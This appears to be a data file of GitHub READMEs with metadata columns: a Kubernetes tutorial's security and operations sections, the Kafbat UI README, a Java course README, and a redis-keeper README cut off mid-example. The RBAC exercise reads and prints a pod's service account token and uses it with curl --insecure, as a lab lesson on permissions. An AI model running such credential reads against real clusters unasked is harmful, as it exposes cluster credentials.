```yaml
k create -f alpine-pod-2-containers.yaml # alpine-pod-2-containers.yaml is in this repo
# exec / ssh into to the alpine2 container
k exec -it alpine-2-containers -c alpine2 -- sh
ls
exit

# or just an one-liner
k exec -it alpine2 -c alpine2 -- ls

# cleanup
k delete pod alpine-2-containers
```

</p>
</details>


### Shared Volume

We'll extend the above alpine-2-containers with a shared volume of type emptyDir named `share` with a volumeMount for each container with a mountPath `/tmp/share1` and `/tmp/share2` as follow:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat alpine-pod-share-volumes.yaml
k apply -f alpine-pod-share-volumes.yaml
k exec -it alpine-2-containers-share-volume -c alpine1 -- sh
touch /tmp/share1/sharefile
echo ""test-share1"" > /tmp/share1/sharefile
cat /tmp/share1/sharefile
exit
k exec -it alpine-2-containers-share-volume -c alpine2 -- cat /tmp/share2/sharefile
```

</p>
</details>

## Security

Kubernetes Security is a huge topic and security hardening is a nice problem which everyone has to implement according to their security requirements and the governance model of their organization. We're going only to scratch the surface of K8s security here and highly recommend to go through the following resources by Michael Hausenblas, Liz Rice and the community.

https://kubernetes-security.info/

https://learn.hashicorp.com/vault/getting-started-k8s/sidecar

https://github.com/k8s-sec/k8s-sec.github.io


### Service Accounts

In K8s each namespace has a default ServiceAccount, named `default`. A ServiceAccount is a namespaced resource used by containers running in a Pod, to communicate with the API server of the Kubernetes cluster. ServiceAccounts with limited permissions are often used to apply the principle of least priviledge.

```bash
k get sa --all-namespaces | grep default
k get sa default -o yaml
k get secret default-<press tab> -o yaml
```

The data key of this Secret has several key/pairs:

```yaml
apiVersion: v1
kind: Secret
data:
  ca.crt: LS0tLS1CRUdJTi...
  namespace: ZGVmYXVsdA==
  token: ZXlKaGJHY2lP...
metadata:
  annotations:
    kubernetes.io/service-account.name: default
...
```

The token is the Base64 encoding of the JWT used to authenticate against the API server.
Let's get the token and head to jwt.io and use the debugger to decode the token.

```bash
kubectl run -it alpine --restart=Never --image=alpine -- sh
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
exit
open https://jwt.io/
```

Paste the token and get the payload, which looks similar to this:

```
{
  ""iss"": ""kubernetes/serviceaccount"",
  ""kubernetes.io/serviceaccount/namespace"": ""default"",
  ""kubernetes.io/serviceaccount/secret.name"": ""default-token-24pbl"",
  ""kubernetes.io/serviceaccount/service-account.name"": ""default"",
  ""kubernetes.io/serviceaccount/service-account.uid"": ""147e134a-43d0-4c76-ad01-bccc59f8acb9"",
  ""sub"": ""system:serviceaccount:default:default""
}
```

We can see the service account default is linked to the namespace where it exists and is using the secret default-token-24pbl. This token is available in the filesystem of each container of the Pod of the attached ServiceAccount.

### Using a Custom ServiceAccount

A Service Account on its own is on not so useful, we need to provide rome rights and permissions to it through a set of rules defined through roles or cluster roles using the RBAC implementation in K8s.  


### RBAC (Role Based Access Control)

RBAC in K8s is activated by default and helps to provide access to resources (objects) like namespaces, pods, services, etc. to those Subjects or Entities like users, group or service accounts who need access to some resources and deny access to other resources who do not need access to them. RBAC increases security in K8s projects and shall be defined through a governance model in each organization (but in the theorie, you know we are all admins ;-)).

RBAC is implemented through Role, ClusterRole, RoleBinding, and ClusterRoleBinding.

#### Role

A Role defines what you or a subject can do to a set of resources, like get, set, delete, etc.A Role contains a set of rules which define a set of permissions. Roles are used to assigning permissions to resources on the namespace level.

#### ClusterRole

Similar to Role, ClusterRole can grant permissions on the Cluster Level such as giving resource permissions across all namespaces in the cluster.

#### RoleBinding and ClusterRoleBinding

RoleBinding and ClusterRoleBinding are used to grant permissions and priviledges to Subjects or Entities on the namespace (project RoleBinding) level or on the cluster level (ClusterRoleBinding).

![RBAC](images/rbac.png ""rbac"")

#### What Weâ€™ll Do

We create a new namespace myapp and a new custom ServiceAccount `mysa`, create a new role `podreader` with the permission to get and list pods and create a rolebinding `mypodviewer` to bind the ServiceAccount to the role podreader in the namespace `myapp`.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k get clusterroles | wc -l
# 62
k get clusterroles
k describe clusterrole view
k describe clusterrole view | grep pods
# the view role allows your application access to many other resources such as deployments and services.
k create namespace myapp
k -n=myapp create serviceaccount mysa
k -n myapp create role podreader --verb=get --verb=list --resource=pods
k -n myapp describe role/podreader
# nice, the role podreader can only view now, but we need to attach the role podreader to our application, represented by the service account myapp. 
k -n myapp create rolebinding mypodviewer --role=podreader --serviceaccount=myapp:mysa
k -n myapp describe rolebindings mypodviewer
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list pods
# yes :-)
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list services
# no :-)
```
</p>
</details>

We extend our alpine pod with the key `serviceAccountName` and the value `mysa`, apply the change and run a shell in the alpine-pod, get the toke belonging to the `mysa` ServiceAccountand use it to list the pods in the default namespace and the myapp namespace to see the differences:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml

kn myapp
cat alpine-pod-service-account.yaml
k apply -f alpine-pod-service-account.yaml
k describe pod alpine-sa
k get sa
k get secrets
k exec -it alpine-sa -- sh
apk add curl
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/default/pods/ --insecure
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/myapp/pods/ --insecure
# what works, what doesn't work?

```
</p>
</details>

#### Further reading:

[Kubernetes Tips: Using a ServiceAccount](https://medium.com/better-programming/k8s-tips-using-a-serviceaccount-801c433d0023)

#### Permission Manager

--> ToDo

## 3-Tier App (MVC)

Please read the README and the related blog post in the [subfolder](3-tier-app/README.md)  3-tier-app and try to understand and get the todo list app up and running.

# Day 2 Operation

Day 2 operation is mainly about implementing some principles like selfhealing and autoscaling for our apps AND the infrastructure components like nodes and K8s components itself and define resources limits, liveness and readiness probes for our apps, run continious security auditing, apply GitOps principles and style, etc.

In this first section we'll go through app auto scaling with Horizontal Pod Autoscaler.

![hpa](images/pod-autoscaling-hpa.png ""hap"")

## Pod AutoScaling with HPA (Horizontal Pod Autoscaler)

```bash
kubectl run hpa-example --image=k8s.gcr.io/hpa-example --requests=cpu=200m --expose --port=80
# create HPA based on CPU usage
kubectl autoscale deployment hpa-example --cpu-percent=50 --min=1 --max=10
# In another terminal run
kubectl run -i --tty generate-load --image=busybox /bin/sh
# Inside the above container run a loop bash command to stress the CPU
while true; do wget -q -O- http://hpa-example.default.svc.cluster.local; done
# Check HPA Status
kubectl get hpa
```

- [Simplify Kubernetes day 2 ops with Palette Cluster Profiles](https://www.spectrocloud.com/blog/kubernetes-day-2-operations-with-cluster-profiles)

## Labs and exercises and hackaton:

[Labs and exercises and hackaton repo](./Labs-and-exercises/)  to help you learn Kubernetes. 

## GitOps

GitOps is an operating model for Kubernetes and other cloud native technologies. It provides a set of best practices that unifies deployment, management, and monitoring for clusters and applications. Another way to put it is: a path towards a developer experience for managing applications; where end-to-end CI and CD pipelines and Git workflows

- https://www.eksworkshop.com/docs/automation/gitops/

- https://medium.com/@seifeddinerajhi/gitops-ci-cd-automation-workflow-using-github-actions-argocd-and-helm-charts-deployed-on-k8s-3811b253030b


- [Provides our opinionated point of view on how GitOps can be used to manage the infrastructure, services and application layers of K8s based systems](https://github.com/cloud-native-toolkit/multi-tenancy-gitops): GitOps Production Deployment Guide

## TroubleShooting

- [COMMON KUBERNETES ERRORS AND HOW THEY IMPACT CLOUD DEPLOYMENTS](https://cloudtweaks.com/2023/01/common-kubernetes-errors/)

- [Exit Codes In Containers & Kubernetes â€“ The Complete Guide](https://komodor.com/learn/exit-codes-in-containers-and-kubernetes-the-complete-guide/)

- [How to identify and troubleshoot common Kubernetes errors](https://newrelic.com/blog/how-to-relic/monitoring-kubernetes-part-three)

- [Kubernetes Troubleshooting: 5 Common Errors & How to Fix Them](https://lumigo.io/kubernetes-troubleshooting/)

- [Kubernetes Troubleshooting â€“ The Complete Guide](https://komodor.com/learn/kubernetes-troubleshooting-the-complete-guide/)


- [A visual guide on troubleshooting Kubernetes deployments](https://learnk8s.io/troubleshooting-deployments)

- [Kubernetes Troubleshooting: Effective Strategies for Unraveling the Puzzle](https://www.groundcover.com/kubernetes-troubleshooting)


- [node-problem-detector](https://github.com/kubernetes/node-problem-detector): This is a place for various problem detectors running on the Kubernetes nodes.


- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat): ""Vulnerable by Design"" cluster environment to learn and practice Kubernetes security using an interactive hands-on playground ğŸš€

##  Kubernetes in the cloud:

### AWS EKS

- [Terraform module to create AWS Elastic Kubernetes (EKS) resources](https://github.com/terraform-aws-modules/terraform-aws-eks)

- [This project](https://github.com/aws-ia/terraform-aws-eks-blueprints) contains a collection of Amazon EKS cluster patterns implemented in Terraform that demonstrate how fast and easy it is for customers to adopt Amazon EKS. The patterns can be used by AWS customers, partners, and internal AWS teams to configure and manage complete EKS clusters that are fully bootstrapped with the operational software that is needed to deploy and operate workloads.

- [EKS Workshop](https://www.eksworkshop.com/)

- [ (Amazon EKS) Best Practices](https://aws.github.io/aws-eks-best-practices/): A best practices guide for day 2 operations, including operational excellence, security, reliability, performance efficiency, and cost optimization.

- [AWS EKS Kubernetes - Masterclass | DevOps, Microservices](https://github.com/stacksimplify/aws-eks-kubernetes-masterclass)


### Azure AKS

- [Azure AKS Kubernetes Masterclass](https://github.com/stacksimplify/azure-aks-kubernetes-masterclass).

- [Official repository for the AKS Landing Zone Accelerator program](https://github.com/Azure/AKS-Landing-Zone-Accelerator): Azure Landing Zone Accelerators are architectural guidance, reference architecture, reference implementations and automation packaged to deploy workload platforms on Azure at Scale and aligned with industry proven practices.

- [Azure Kubernetes Service Checklist](https://www.the-aks-checklist.com/): This checklist contains a large set of best practices and some of them may not be relevant to your context and thus the rating may be incorrect in your case. Please choose and apply them wisely.


### Google GKE

- [Configures opinionated GKE clusters in terraform](https://github.com/terraform-google-modules/terraform-google-kubernetes-engine)

- [Sample applications for Google Kubernetes Engine (GKE)](https://github.com/GoogleCloudPlatform/kubernetes-engine-samples)


### Common

- [Elastic Cloud on Kubernetes](https://github.com/elastic/cloud-on-k8s): Elastic Cloud on Kubernetes automates the deployment, provisioning, management, and orchestration of Elasticsearch, Kibana, APM Server, Enterprise Search, Beats, Elastic Agent, Elastic Maps Server, and Logstash on Kubernetes based on the operator pattern.


## playgrounds 

- [Kubernetes Playground](https://github.com/netgroup/kubernetes-playground) - Let's play with Kubernetes in a safe sandbox.

- [Gluster file system with Kubernetes](https://github.com/bwolf/gluster-k8s-playground) - Playground to experiment with Gluster and Kubernetes.

- [A standalone Kubernetes cluster](https://github.com/nextbreakpoint/kubernetes-playground)  - Scripts for creating a standalone Kubernetes cluster for development.

- [Playground](https://labs.play-with-k8s.com/) -  Play with Kubernetes is a playground which allows users to run K8s clusters in a matter of seconds.

## CNCF certifications:

- [Kubernetes CKS Full Course](https://www.youtube.com/watch?v=d9xfB5qaOfg) Theory + Practice + Browser Scenarios by Kim Wuestkamp

- [Kubernetes CKS Course Environment](https://github.com/killer-sh/cks-course-environment)

- [Certified Kubernetes Security Specialist - CKS](https://github.com/walidshaari/Certified-Kubernetes-Security-Specialist): Curated resources help you prepare for the CNCF/Linux Foundation CKS 2021 ""Kubernetes Certified Security Specialist"" Certification exam.

- [Kubernetes Certified Administration](https://github.com/walidshaari/Kubernetes-Certified-Administrator): Online resources that will help you prepare for taking the CNCF CKA 2020 ""Kubernetes Certified Administrator"" Certification exam.

- [CKA preparation](https://github.com/alijahnas/CKA-practice-exercises): This is a guide for passing the CNCF Certified Kubernetes Administrator (CKA) with practice exercises.

- [CKA Exercises](https://github.com/chadmcrowell/CKA-Exercises): Practice for the Certified Kubernetes Administrator (CKA) Exam.

## Kubernetes IAC:

Certainly! Here's a list of some popular tools for managing Kubernetes Infrastructure as Code (IAC):

1. **Helm:**
   - Overview: Helm is a package manager for Kubernetes that simplifies the deployment and management of applications.
   - GitHub: [Helm GitHub Repository](https://github.com/helm/helm)

2. **Kustomize:**
   - Overview: Kustomize is a tool for customizing Kubernetes manifests, allowing you to manage configuration variations in a declarative way.
   - GitHub: [Kustomize GitHub Repository](https://github.com/kubernetes-sigs/kustomize)

3. **Kubeconfig Management:**
   - Tools like `kubectx` and `kubens` help manage and switch between multiple Kubernetes contexts and namespaces.
   - GitHub: [kubectx GitHub Repository](https://github.com/ahmetb/kubectx)

4. **Kubeval:**
   - Overview: Kubeval is a tool for validating Kubernetes manifests against the Kubernetes API schema.
   - GitHub: [Kubeval GitHub Repository](https://github.com/instrumenta/kubeval)

5. **Kops:**
   - Overview: Kops helps you create, destroy, upgrade, and maintain Kubernetes clusters on AWS.
   - GitHub: [Kops GitHub Repository](https://github.com/kubernetes/kops)

6. **Terraform:**
   - Overview: While not specific to Kubernetes, Terraform is widely used for IAC and can be used to provision and manage Kubernetes infrastructure.
   - Website: [Terraform](https://www.terraform.io/)

7. **Pulumi:**
   - Overview: Pulumi allows you to define infrastructure as code using familiar programming languages, including TypeScript, Python, and Go.
   - GitHub: [Pulumi GitHub Repository](https://github.com/pulumi/pulumi)

8. **Helmfile:**
   - Overview: Declaratively deploy your Kubernetes manifests, Kustomize configs, and Charts as Helm releases. Generate all-in-one manifests for use with ArgoCD.
   - GitHub: [Kubeform GitHub Repository](https://github.com/helmfile/helmfile)

9. **Jsonnet:**
   - Overview: Jsonnet is a data templating language that can be used to generate Kubernetes manifests.
   - GitHub: [Jsonnet GitHub Repository](https://github.com/google/jsonnet)

10. **Skaffold:**
    - Overview: Skaffold is a command-line tool that facilitates continuous development for Kubernetes applications.
    - GitHub: [Skaffold GitHub Repository](https://github.com/GoogleContainerTools/skaffold)

This is not an exhaustive list, and the choice of tools depends on your specific use case and preferences. Always check the official documentation and community support for each tool for the most accurate and up-to-date information.

### Coming next

* Cluster Operation and maintanance

* Nodes AutoScaling and AutoSpotting (on AWS)

* Logging and Monitoring with Operators

* Cloud Native Storage for Statefulsets

* Backup & Recovery

* Service Mesh


## â¤ Show your support

Give a â­ï¸ if this project helped you, Happy learning!
",0,0,76,41.0,"['practical', 'kubernetes', 'exercices', 'prerequisite', 'preparation', 'tool', 'use', 'kubernetes', 'guide', 'network', 'security', 'storage', 'misc', 'useful', 'alias', 'kubectl', 'cheatsheet', 'goody', 'list', 'event', 'sort', 'timestamp', 'list', 'service', 'sort', 'name', 'get', 'pod', 'yaml', 'without', 'cluster', 'specific', 'information', 'show', 'label', 'pod', 'or', 'object', 'all', 'resource', 'support', 'list', 'get', 'request', 'verb', 'k', 'create', 'namespace', 'imperative', 'via', 'declarative', 'k', 'create', 'run', 'pod', 'deploymens', 'old', 'school', 'go', 'get', 'deprecate', 'create', 'service', 'via', 'expose', 'pod', 'open', 'new', 'terminal', 'session', 'caution', 'adapt', 'number', 'replica', 'k', 'get', 'event', 'log', 'describe', 'object', 'caution', 'ingres', 'ingress', 'object', 'namespaced', 'merge', 'context', 'merge', 'kubeconfigs', 'cluster', 'context', 'test', 'kubernetes', 'secret', 'secret', 'further', 'reading', 'kubernetes', 'configmaps', 'whoami', 'whoareyou', 'whereami', 'problem', 'what', 'we', 'll', 'do', 'expose', 'deployment', 'service', 'type', 'clusterip', 'new', 'terminal', 'session', 'call', 'create', 'service', 'type', 'nodeport', 'adapt', 'nodeport', 'env', 'please', 'give', 'lb', 'ip', 'pool', 'happy', 'dns', 'base', 'service', 'discovery', 'whereami', 'kubia', 'pod', 'what', 'we', 'll', 'do', 'repeat', 'service', 'call', 'many', 'time', 'see', 'loadbalancing', 'work', 'get', 'pong', 'why', 'ssh', 'node', 'examine', 'iptable', 'rule', 'headless', 'service', 'stickiness', 'inside', 'utils', 'container', 'difference', 'here', 'hit', 'kubia', 'one', 'node', 'load', 'balance', 'via', 'head', 'please', 'provide', 'host', 'entry', 'mapping', 'file', 'like', 'this', 'ip', 'ip', 'traefik', 'loadbalancer', 'ingres', 'controller', 'ingress', 'controller', 'load', 'balancing', 'although', 'define', 'backend', 'servicename', 'ingres', 'tl', 'alternatively', 'ca', 'want', 'use', 'mkcert', 'create', 'selfsigned', 'cert', 'with', 'openssl', 'genrsa', 'openssl', 'req', 'k', 'create', 'secret', 'tls', 'please', 'provide', 'host', 'entry', 'mapping', 'file', 'like', 'this', 'ip', 'ip', 'traefik', 'loadbalancer', 'ingres', 'controller', 'change', 'service', 'type', 'loadbalancer', 'access', 'ghost', 'loadbalancer', 'ip', 'port', 'node', 'work', 'trafik', 'only', 'scale', 'deployment', 'replica', 'see', 'backend', 'ghost', 'backened', 'http', 'work', 'pod', 'repo', 'exec', 'ssh', 'container', 'cleanup', 'share', 'volume', 'security', 'service', 'account', 'use', 'custom', 'serviceaccount', 'rbac', 'role', 'base', 'access', 'control', 'role', 'clusterrole', 'rolebinding', 'clusterrolebinding', 'what', 'we', 'll', 'do', 'view', 'role', 'allow', 'application', 'access', 'many', 'resource', 'deployment', 'service', 'nice', 'role', 'podreader', 'view', 'now', 'need', 'attach', 'role', 'podreader', 'application', 'represent', 'service', 'account', 'myapp', 'yes', 'work', 'work', 'further', 'reading', 'permission', 'manager', 'app', 'mvc', 'day', 'operation', 'pod', 'autoscaling', 'hpa', 'horizontal', 'pod', 'autoscaler', 'create', 'hpa', 'base', 'cpu', 'usage', 'in', 'another', 'terminal', 'run', 'inside', 'container', 'run', 'loop', 'bash', 'command', 'stress', 'cpu', 'check', 'hpa', 'status', 'lab', 'exercise', 'hackaton', 'gitops', 'troubleshoot', 'kubernetes', 'cloud', 'aws', 'eks', 'azure', 'ak', 'google', 'gke', 'common', 'playground', 'cncf', 'certification', 'kubernetes', 'iac', 'come', 'next', 'show', 'support']","['service', 'pod', 'create', 'kubernetes', 'ip']",4.0,"[org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.springdoc:springdoc-openapi-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,0.0
kafbat/kafka-ui,main,"<div align=""center"">
<img src=""documentation/images/logo_new.png"" alt=""logo""/>
<h3>Kafbat UI</h3>

Versatile, fast and lightweight web UI for managing Apache KafkaÂ® clusters.
</div>

<div align=""center"">
<a href=""https://github.com/kafbat/kafka-ui/blob/main/LICENSE""><img src=""https://img.shields.io/badge/License-Apache%202.0-blue.svg"" alt=""License""/></a>
<img src=""documentation/images/free-open-source.svg"" alt=""price free""/>
<a href=""https://github.com/kafbat/kafka-ui/releases""><img src=""https://img.shields.io/github/v/release/kafbat/kafka-ui"" alt=""latest release version""/></a>
<a href=""https://discord.gg/4DWzD7pGE5""><img src=""https://img.shields.io/discord/897805035122077716"" alt=""discord online number count""/></a>
<a href=""https://github.com/sponsors/kafbat""><img src=""https://img.shields.io/github/sponsors/kafbat?style=flat&logo=githubsponsors&logoColor=%23EA4AAA&label=Support%20us"" alt="""" /></a>
</div>

<p align=""center"">
    <a href=""https://ui.docs.kafbat.io/"">Documentation</a> â€¢ 
    <a href=""https://ui.docs.kafbat.io/configuration/quick-start"">Quick Start</a> â€¢ 
    <a href=""https://discord.gg/4DWzD7pGE5"">Community</a>
    <br/>
    <a href=""https://aws.amazon.com/marketplace/pp/{replaceMe}"">AWS Marketplace</a>  â€¢
    <a href=""https://www.producthunt.com/products/ui-for-apache-kafka/reviews/new"">ProductHunt</a>
</p>

<p align=""center"">
  <img src=""https://repobeats.axiom.co/api/embed/88d2bd9887380c7d86e2f986725d9af52ebad7f4.svg"" alt=""stats""/>
</p>

#### Kafbat UI is a free, open-source web UI to monitor and manage Apache Kafka clusters.

Kafbat UI is a simple tool that makes your data flows observable, helps find and troubleshoot issues faster and deliver optimal performance. Its lightweight dashboard makes it easy to track key metrics of your Kafka clusters - Brokers, Topics, Partitions, Production, and Consumption.

<i>
Kafbat UI, developed by <b>Kafbat</b>*, proudly carries forward the legacy of the UI Apache Kafka project.
Our dedication is reflected in the continuous evolution of the project, ensuring adherence to its foundational vision while adapting to meet modern demands.
We extend our gratitude to Provectus for their past support in groundbreaking work, which serves as a cornerstone for our ongoing innovation and dedication.

<b>*</b> - The <b>Kafbat</b> team comprises key contributors from the project's inception, bringing a wealth of experience and insight to this renewed endeavor.
</i>

# Interface

![Interface](https://raw.githubusercontent.com/kafbat/kafka-ui/images/overview.gif)

# Features
* **Multi-Cluster Management** â€” monitor and manage all your clusters in one place
* **Performance Monitoring with Metrics Dashboard** â€”  track key Kafka metrics with a lightweight dashboard
* **View Kafka Brokers** â€” view topic and partition assignments, controller status
* **View Kafka Topics** â€” view partition count, replication status, and custom configuration
* **View Consumer Groups** â€” view per-partition parked offsets, combined and per-partition lag
* **Browse Messages** â€” browse messages with JSON, plain text, and Avro encoding
* **Dynamic Topic Configuration** â€” create and configure new topics with dynamic configuration
* **Configurable Authentification** â€” [secure](https://ui.docs.kafbat.io/configuration/authentication) your installation with optional Github/Gitlab/Google OAuth 2.0
* **Custom serialization/deserialization plugins** - [use](https://ui.docs.kafbat.io/configuration/serialization-serde) a ready-to-go serde for your data like AWS Glue or Smile, or code your own!
* **Role based access control** - [manage permissions](https://ui.docs.kafbat.io/configuration/rbac-role-based-access-control) to access the UI with granular precision
* **Data masking** - [obfuscate](https://ui.docs.kafbat.io/configuration/data-masking) sensitive data in topic messages

## Feature overview

<details>
    <summary>Click here for the feature overview</summary>

# The Interface
Kafbat UI wraps major functions of Apache Kafka with an intuitive user interface.

![Interface](documentation/images/Interface.gif)

## Topics
Kafbat UI makes it easy for you to create topics in your browser by several clicks,
pasting your own parameters, and viewing topics in the list.

![Create Topic](documentation/images/Create_topic_kafka-ui.gif)

It's possible to jump from connectors view to corresponding topics and from a topic to consumers (back and forth) for more convenient navigation.
connectors, overview topic settings.

![Connector_Topic_Consumer](documentation/images/Connector_Topic_Consumer.gif)

### Messages
Let's say we want to produce messages for our topic. With the Kafbat UI we can send or write data/messages to the Kafka topics without effort by specifying parameters, and viewing messages in the list.

![Produce Message](documentation/images/Create_message_kafka-ui.gif)

## Schema registry
There are 3 supported types of schemas: AvroÂ®, JSON Schema, and Protobuf schemas.

![Create Schema Registry](documentation/images/Create_schema.gif)

Before producing avro/protobuf encoded messages, you have to add a schema for the topic in Schema Registry. Now all these steps are easy to do
with a few clicks in a user-friendly interface.

![Avro Schema Topic](documentation/images/Schema_Topic.gif)

</details>

# Getting Started

To run Kafbat UI, you can use either a pre-built Docker image or build it (or a jar file) yourself.

## Quick start (Demo run)

```
docker run -it -p 8080:8080 -e DYNAMIC_CONFIG_ENABLED=true ghcr.io/kafbat/kafka-ui
```

Then access the web UI at [http://localhost:8080](http://localhost:8080)

The command is sufficient to try things out. When you're done trying things out, you can proceed with a [persistent installation](https://ui.docs.kafbat.io/quick-start/persistent-start)

## Persistent installation

```
services:
  kafbat-ui:
    container_name: kafbat-ui
    image: ghcr.io/kafbat/kafka-ui:latest
    ports:
      - 8080:8080
    environment:
      DYNAMIC_CONFIG_ENABLED: 'true'
    volumes:
      - ~/kui/config.yml:/etc/kafkaui/dynamic_config.yaml
```

Please refer to our [configuration](https://ui.docs.kafbat.io/configuration/configuration-file) page to proceed with further app configuration.

## Some useful configuration related links

[Web UI Cluster Configuration Wizard](https://ui.docs.kafbat.io/configuration/configuration-wizard)

[Configuration file explanation](https://ui.docs.kafbat.io/configuration/configuration-file)

[Docker Compose examples](https://ui.docs.kafbat.io/configuration/compose-examples)

[Misc configuration properties](https://ui.docs.kafbat.io/configuration/misc-configuration-properties)

## Helm charts

[Quick start](https://ui.docs.kafbat.io/configuration/helm-charts/quick-start)

## Building from sources

[Quick start](https://ui.docs.kafbat.io/development/building/prerequisites) with building

## Liveliness and readiness probes
Liveliness and readiness endpoint is at `/actuator/health`.<br/>
Info endpoint (build info) is located at `/actuator/info`.

# Configuration options

All the environment variables/config properties could be found [here](https://ui.docs.kafbat.io/configuration/misc-configuration-properties).

# Contributing

Please refer to [contributing guide](https://ui.docs.kafbat.io/development/contributing), we'll guide you from there.

# Support

As we're fully independent, team members contribute in their free time.
Your support is crucial for us, if you wish to sponsor us, take a look [here](https://github.com/sponsors/kafbat) 
",1,120,51,155.0,"['kafbat', 'ui', 'free', 'web', 'ui', 'monitor', 'manage', 'apache', 'kafka', 'cluster', 'interface', 'feature', 'feature', 'overview', 'the', 'interface', 'topic', 'message', 'schema', 'registry', 'get', 'start', 'quick', 'start', 'demo', 'run', 'persistent', 'installation', 'some', 'useful', 'configuration', 'relate', 'link', 'helm', 'chart', 'building', 'source', 'liveliness', 'readiness', 'probe', 'configuration', 'option', 'contribute', 'support']","['ui', 'interface', 'feature', 'start', 'configuration']",5.0,"[com.github.eirslett:frontend-maven-plugin,io.fabric8:docker-maven-plugin,io.qameta.allure:allure-maven,maven-resources-plugin,org.antlr:antlr4-maven-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.openapitools:openapi-generator-maven-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,pl.project13.maven:git-commit-id-plugin]",0.0,4.0,1.0
vivekanand-vr/iNeuron-codebase,main,"# Java Backend Development Programs

Welcome to my collection of Java Full Stack Development programs! This repository contains a variety of programs and projects that I've implemented using multiple technologies in the Java ecosystem. 
Feel free to explore the projects and delve into the codebase to gain insights into various Java technologies.

#### â–¶ï¸ Detailed Handwritten Notes: <a href=""https://drive.google.com/drive/u/3/folders/1g-Lal7BTqHNVgoMwT-YkQvwZS8qAEzLT""> Drive Link </a>
#### â–¶ï¸ Course Details: <a href=""https://ineuron.ai/course/full-stack-java-developer""> Link </a>

## Technologies Used
- Backend : Java, JDBC, Servlets, JSP, JSTL, Hibernate ORM, Spring Core, Spring Boot, REST-APIs, Microservices
- Databases : MySQL, MongoDB, PostgreSQL
- Developer Tools : Git, Maven, SL4J, Apache Kafka, Redis Cache


## Usage
- Pull the repo and import the projects in your Eclipse IDE, also make sure to include the necessary jar and war files to run the project.
- Open Eclipse IDE and choose a folder to create a workspace. Then follow the below steps to import multiple projects of a chapter in one go
- Make sure to add the required **Jar files** (Mysql connector, Hikaricp etc) in the initial programs of JDBC, JSP, and Hibernate as there is no project management tool used here.

## Follow the steps to import in Eclipse IDE
  
  ### `Step 1` : Choose ""import projects"" on the left panel of eclipse or in File dropdown
  
  ![Import](https://github.com/vivekanand-vr/iNeuron-codebase/assets/116813193/590f443e-c624-4c4f-ad6f-717e7cb483da)
  
  ### `Step 2` : Choose General > Existing projects as shown
  
  ![Import Options](https://github.com/vivekanand-vr/iNeuron-codebase/assets/116813193/cd771aed-fec3-4162-a030-6100b86870fe)

  ### `Step 3` : Select the Chapter folder and select all the sub folders/programs and click on next
  
  ![Root project](https://github.com/vivekanand-vr/iNeuron-codebase/assets/116813193/a75e9449-3549-43cd-b7f3-13a5c6f5de50)

## Contribution
Contributions are welcome! If you have any suggestions, improvements, or would like to contribute to any of the projects, feel free to open an issue or submit a pull request.

",0,0,1,0.0,"['java', 'backend', 'development', 'program', 'detailed', 'handwritten', 'note', 'a', 'http', 'drive', 'link', 'course', 'detail', 'a', 'http', 'link', 'technology', 'use', 'usage', 'follow', 'step', 'import', 'eclipse', 'ide', 'step', 'choose', 'import', 'project', 'leave', 'panel', 'eclipse', 'file', 'dropdown', 'step', 'choose', 'general', 'existing', 'project', 'show', 'step', 'select', 'chapter', 'folder', 'select', 'sub', 'click', 'next', 'contribution']","['step', 'a', 'http', 'link', 'import']",139.0,"[maven-clean-plugin,maven-compiler-plugin,maven-deploy-plugin,maven-install-plugin,maven-jar-plugin,maven-project-info-reports-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin,maven-war-plugin,org.apache.tomcat.maven:tomcat7-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",55.0,80.0,4.0
codebaorg/redis-keeper,main,"<h4 align=""right""><strong>English</strong> | <a href=""./README_zh.md"">ç®€ä½“ä¸­æ–‡</a></h4>

# Redis keeper - Lightweight Redis Multi-datasource Management Tool
[![Maven Central](https://maven-badges.herokuapp.com/maven-central/org.redisson/redisson/badge.svg)](https://central.sonatype.com/artifact/org.codeba/redis-keeper)
[![License](http://img.shields.io/:license-apache-brightgreen.svg)](http://www.apache.org/licenses/LICENSE-2.0.html)


**Supported JDK: 1.8 ... 21**

**Supported Redisson: 3.15.5 ... 3.35.0**

**Supported Redis: 3.0 ... 7.2**

## Features

* Based on redisson package, retain all the powerful features of redisson
* Support for multiple data source configuration and real-time updates for redis
* Support ""read-only"", ""write-only"", ""read-write"" and ""skip"" state switching for redis data sources
* Excellent expandability and compatibility to meet all your needs


## Quick start

#### Maven
    <dependency>
       <groupId>org.codeba</groupId>
       <artifactId>redis-keeper-core</artifactId>
       <version>2024.2.0</version>
    </dependency> 

    <dependency>
       <groupId>org.codeba</groupId>
       <artifactId>redis-keeper-support</artifactId>
       <version>2024.2.0</version>
    </dependency> 

#### Gradle

    implementation group: 'org.codeba', name: 'redis-keeper-core', version: '2024.2.0'

    implementation group: 'org.codeba', name: 'redis-keeper-support', version: '2024.2.0'

#### Sbt

    libraryDependencies += ""org.codeba"" % ""redis-keeper-core"" % ""2024.2.0""
    
    libraryDependencies += ""org.codeba"" % ""redis-keeper-support"" % ""2024.2.0""


#### Java

```java
// 1. Create config object
Config config = new Config();
